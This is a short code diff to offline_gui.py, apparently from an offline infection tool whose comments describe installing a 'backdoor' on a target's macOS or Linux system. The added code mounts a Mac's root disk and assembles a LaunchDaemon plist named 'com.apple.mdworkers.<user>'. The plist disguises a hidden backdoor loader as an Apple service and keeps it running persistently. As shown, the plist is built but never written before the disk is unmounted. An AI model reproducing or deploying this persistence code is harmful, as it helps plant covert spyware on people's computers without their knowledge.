--- offline-install/offline_gui.py	2014-05-05 15:00:00.498298358 +0200
+++ ../offline_gui.py	2014-05-05 17:47:58.789960826 +0200
@@ -292,6 +292,7 @@
 			if i[0] == 'os x' and i[3] == '/':
 				tableosx.update({'rootdisk': i[1]})
 				tableosx.update({'rootfs': i[2]})
+				tableosx.update({'rootfsrw': 'ufsd'})
 				tableosx.update({'rootmount': i[3]})
 				break
 
@@ -1176,6 +1177,54 @@
 
 		print("    Install [OK] -> " + user + " on Mac OS X system...")
 
+		try:
+			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfsrw'], self.tabosx['rootdisk']), shell=True)
+		except:
+			return
+
+		home = None
+
+		for i in self.useosx:
+			if i['username'] == user:
+				if i['status'] == True:
+					try:
+						ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+					except:
+						pass
+					return
+
+				home = i['home']
+				break
+		
+		temp_backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_"
+		temporary_loader = "4872364829"
+		mdworker_plist_contect =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" \
+					  "<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" \
+					  "<plist version=\"1.0\">\n" \
+					  "<dict>\n" \
+					  "<key>Label</key>\n" \
+					  "<string>com.apple.mdworkers." + user + "</string>\n" \
+					  "<key>ProgramArguments</key>\n" \
+					  "<array>\n" \
+					  "<string>" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_/" + temporary_loader + "</string>\n" \
+					  "<string>" + user +"</string>\n" \
+					  "<string>" + self.backconf['hdir'] +"</string>\n" \
+					  "<string>" + self.backconf['hcore'] +"</string>\n" \
+					  "</array>\n" \
+					  "<key>KeepAlive</key>\n" \
+					  "<dict>\n" \
+					  "<key>SuccessfulExit</key>\n" \
+					  "<false/>\n" \
+					  "</dict>\n" \
+					  "</dict>\n" \
+					  "</plist>"
+		plist_path = "/mnt/System/Library/LaunchDaemons/com.apple.mdworkers." + user + ".plist"
+
+		try:
+			ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
+		except:
+			return
+
 	#
 	# Install the infection vector on Linux system with the backdoor of the user
 	##
